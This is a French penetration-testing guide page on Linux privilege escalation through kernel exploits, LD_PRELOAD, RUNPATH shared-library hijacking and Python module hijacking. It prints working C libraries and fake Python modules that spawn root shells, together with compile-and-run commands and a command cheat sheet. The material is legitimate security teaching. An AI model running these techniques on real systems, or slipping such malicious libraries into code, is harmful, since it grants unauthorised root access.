# Mecanismes internes : noyau, bibliotheques et hijacking

Au-dela des erreurs de configuration, certains vecteurs d'escalade exploitent directement les mecanismes internes du systeme : vulnerabilites du noyau, chargement de bibliotheques partagees et detournement de modules Python. Ces techniques sont souvent les plus puissantes mais aussi les plus risquees.

## Pourquoi

Les exploits noyau transforment n'importe quel utilisateur en root en une seule commande. Les bibliotheques partagees et les modules Python sont charges dynamiquement a l'execution, ce qui les rend vulnerables au detournement si les chemins de recherche ou les permissions sont mal configures. Ces vecteurs sont particulierement pertinents quand les approches classiques (sudo, SUID, cron) ne donnent rien.

## Comment ca marche

### Kernel exploits

Le noyau Linux est le composant qui gere les privileges sur le systeme. Une vulnerabilite dans le noyau permet de passer directement de n'importe quel utilisateur a root. Le processus est generalement simple : identifier la version du noyau, trouver un exploit public, le compiler et l'executer.

| Risque | Detail |
|---|---|
| **Instabilite** | Les exploits noyau peuvent provoquer un kernel panic |
| **Specifique a la version** | Chaque exploit cible des versions precises du noyau |
| **Detection** | La compilation et l'execution d'exploits generent du bruit |

### Bibliotheques partagees

Les programmes Linux utilisent des bibliotheques partagees (`.so`) chargees dynamiquement a l'execution. Trois mecanismes permettent le detournement.

| Mecanisme | Principe |
|---|---|
| **LD_PRELOAD** | Variable d'environnement qui force le chargement d'une bibliotheque avant toutes les autres |
| **RUNPATH / RPATH** | Chemin de recherche compile dans le binaire, peut pointer vers un repertoire modifiable |
| **ld.so.preload** | Fichier systeme (`/etc/ld.so.preload`) qui force le chargement global d'une bibliotheque |

### Python library hijacking

Python cherche les modules dans un ordre precis defini par `sys.path`. Le detournement exploite trois situations.

| Situation | Exploitation |
|---|---|
| **Permissions en ecriture sur le module** | Modifier directement le code du module importe |
| **Chemin de recherche prioritaire modifiable** | Placer un faux module dans un repertoire prioritaire |
| **Variable PYTHONPATH** | Rediriger la recherche de modules via la variable d'environnement |

## En pratique

### Kernel exploits

```bash
# - Identifier la version du noyau
uname -r
# 4.4.0-116-generic

cat /etc/os-release
# Ubuntu 16.04.4 LTS

# - Chercher un exploit adapte
# Rechercher sur Google : "linux 4.4.0-116 exploit"
# Ou utiliser linux-exploit-suggester

# - Telecharger, compiler et executer
gcc kernel_exploit.c -o kernel_exploit
chmod +x kernel_exploit
./kernel_exploit

# Resultat typique :
# task_struct = ffff8800b71d7000
# spawning root shell
# root@target:# id
# uid=0(root) gid=0(root) groups=0(root)
```

{% hint style="danger" %}
Les exploits noyau peuvent planter le systeme. Ne jamais les utiliser en production sans l'accord explicite du client. Toujours les tester sur un systeme de lab identique avant de les executer sur la cible.
{% endhint %}

### LD_PRELOAD

```bash
# - Verifier si LD_PRELOAD est preserve par sudo
sudo -l
# env_keep+=LD_PRELOAD
# (root) NOPASSWD: /usr/sbin/apache2 restart

# - Creer une bibliotheque malveillante
cat << 'EOF' > /tmp/root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# - Compiler la bibliotheque
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

# - Executer avec LD_PRELOAD
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
# uid=0(root) gid=0(root) groups=0(root)
```

{% hint style="info" %}
Cette technique ne fonctionne que si `env_keep+=LD_PRELOAD` est present dans la configuration sudo. Par defaut, `env_reset` supprime les variables d'environnement dangereuses.
{% endhint %}

### Shared object hijacking (RUNPATH)

```bash
# - Identifier un binaire SUID avec une dependance non standard
ls -la payroll
# -rwsr-xr-x 1 root root 16728 payroll

ldd payroll
# libshared.so => /development/libshared.so

# - Verifier le RUNPATH
readelf -d payroll | grep PATH
# RUNPATH: [/development]

# - Verifier les permissions du repertoire
ls -la /development/
# drwxrwxrwx 2 root root 4096 .

# - Identifier la fonction appelee
./payroll
# undefined symbol: dbquery

# - Creer une bibliotheque malveillante
cat << 'EOF' > /tmp/src.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void dbquery() {
    printf("Bibliotheque malveillante chargee\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF

gcc /tmp/src.c -fPIC -shared -o /development/libshared.so

# - Executer le binaire SUID
./payroll
# Bibliotheque malveillante chargee
# # id
# uid=0(root)
```

### Python library hijacking

{% tabs %}
{% tab title="Permissions sur le module" %}
```bash
# - Identifier un script sudo Python
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /home/user/mem_status.py

# - Trouver le module importe et verifier ses permissions
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw- 1 root staff 87339 __init__.py
# (writable par tous)

# - Injecter du code dans la fonction
# Ajouter au debut de virtual_memory() :
# import os
# os.system('/bin/bash')

# - Executer le script avec sudo
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root)
```
{% endtab %}
{% tab title="Chemin de recherche" %}
```bash
# - Verifier l'ordre de recherche Python
python3 -c 'import sys; print("\n".join(sys.path))'
# /usr/lib/python3.8
# /usr/local/lib/python3.8/dist-packages

# - Si /usr/lib/python3.8 est writable et prioritaire
ls -la /usr/lib/python3.8
# drwxr-xrwx (writable par tous)

# - Creer un faux module avec le meme nom
cat << 'EOF' > /usr/lib/python3.8/psutil.py
import os
def virtual_memory():
    os.system('id')
EOF

# - Executer le script sudo
sudo /usr/bin/python3 mem_status.py
# uid=0(root)
```
{% endtab %}
{% tab title="Variable PYTHONPATH" %}
```bash
# - Verifier si SETENV est autorise
sudo -l
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

# - Creer un faux module dans /tmp
cat << 'EOF' > /tmp/psutil.py
import os
def virtual_memory():
    os.system('/bin/bash')
EOF

# - Executer avec PYTHONPATH modifie
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
# uid=0(root)
```
{% endtab %}
{% endtabs %}

## Pieges et galeres

- **Kernel panic** : un exploit noyau defectueux ou mal cible peut rendre le systeme inaccessible. Verifier que la version correspond exactement
- **LD_PRELOAD et env_reset** : la plupart des configurations sudo modernes suppriment `LD_PRELOAD`. Cette technique fonctionne uniquement si `env_keep` le preserve explicitement
- **RUNPATH vs RPATH** : `RUNPATH` et `RPATH` se comportent differemment dans l'ordre de recherche des bibliotheques. `RUNPATH` est prioritaire sur `LD_LIBRARY_PATH`, mais pas `RPATH`
- **Python et arguments** : le module malveillant doit avoir exactement le meme nom que celui importe et definir les memes fonctions avec le bon nombre d'arguments. Sinon le script cible echoue avant l'execution du code injecte
- **Nettoyage** : toujours restaurer les fichiers modifies apres exploitation (bibliotheques, modules Python, `/etc/ld.so.preload`)

## Memo express

| Commande | Usage |
|---|---|
| `uname -r` | Version du noyau |
| `gcc exploit.c -o exploit` | Compiler un kernel exploit |
| `sudo -l` (chercher `env_keep+=LD_PRELOAD`) | Verifier LD_PRELOAD |
| `gcc -fPIC -shared -o lib.so src.c -nostartfiles` | Compiler une bibliotheque |
| `sudo LD_PRELOAD=/tmp/root.so <cmd>` | Exploitation LD_PRELOAD |
| `readelf -d <binaire> \| grep PATH` | RUNPATH du binaire |
| `ldd <binaire>` | Dependances du binaire |
| `python3 -c 'import sys; print(sys.path)'` | Chemin de recherche Python |
| `sudo PYTHONPATH=/tmp/ python3 script.py` | Hijacking PYTHONPATH |

***
